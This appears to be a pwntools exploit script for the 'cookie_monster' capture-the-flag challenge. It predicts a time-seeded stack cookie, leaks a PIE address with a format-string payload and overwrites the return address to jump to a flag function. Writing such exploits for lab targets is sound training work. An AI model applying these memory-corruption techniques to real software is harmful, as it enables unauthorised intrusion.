#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ctf.umbccd.io --port 4200 --path ./cookie_monster ./cookie_monster
from pwn import *
from ctypes import CDLL
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./cookie_monster')
c = CDLL("/lib/x86_64-linux-gnu/libc-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.umbccd.io'
port = int(args.PORT or 4200)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

t = c.time(0)
c.srand(t)

io = start()


cookie = c.rand()
log.info("Cookie: %x", cookie)

io.recvuntil("Oh hello there, what's your name?\n")
payload = (
    "%17$p"
)
io.sendline(payload)
data = io.recvuntil("Would you like a cookie?\n")
leak = int(re.search(b"Hello, (0x[0-9a-f]+)\n", data).group(1), 16)
#exe.address = leak - 0x143d 
exe.address = leak - 0x1337 
flag = exe.address + 0x11b5 

log.info("Leak: 0x%x", leak)
log.info("Exe: 0x%x", exe.address)
log.info("Flag: 0x%x", flag)

payload = (
        b"A" * 13 +
        p32(cookie) +
        b"B" * 8 +
        p64(flag)
)

io.sendline(payload)


io.interactive()

